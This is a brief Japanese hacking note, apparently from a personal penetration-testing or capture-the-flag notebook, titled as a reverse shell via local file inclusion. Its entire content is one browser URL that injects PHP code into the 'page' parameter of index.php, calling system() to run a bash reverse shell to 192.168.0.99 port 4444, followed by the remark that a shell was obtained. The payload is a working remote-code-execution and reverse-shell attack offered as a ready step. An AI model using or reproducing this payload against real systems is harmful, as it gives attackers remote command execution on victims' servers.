○LFIを利用したリバースシェル

ブラウザに以下を入力

http://192.168.0.104/index.php?page='+and+die(system("bash+-c+'bash+-i+>%26+/dev/tcp/192.168.0.99/4444+0>%261'"))+or+'

![[webへの攻撃 image.png]]

シェルゲット